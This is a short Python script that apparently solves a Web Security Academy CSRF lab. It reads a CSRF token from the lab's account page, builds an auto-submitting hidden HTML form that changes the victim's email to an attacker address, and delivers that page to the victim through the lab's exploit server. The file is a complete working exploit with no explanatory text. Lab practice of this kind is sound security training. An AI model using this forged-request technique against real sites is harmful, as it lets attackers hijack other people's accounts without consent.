import requests
from bs4 import BeautifulSoup

site = 'ac4c1f991f5506dcc0b9838c007000e5.web-security-academy.net'
s = requests.Session()

if __name__ == "__main__":
    change_url = f'https://{site}/my-account'
    resp = s.get(change_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    url = f'https://{site}/'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')

    exploit_html = f'''<html>
      <body>
          <form action="https://{site}/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net">
            <input type="hidden" name="csrf" value="{csrf}">
            </form>
            <script>
              document.forms[0].submit();
            </script>
      </body>
    </html>'''

    formData = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
        'responseBody': exploit_html,
        'formAction': 'DELIVER_TO_VICTIM'
    }
    resp = s.post(exploit_url, data=formData)
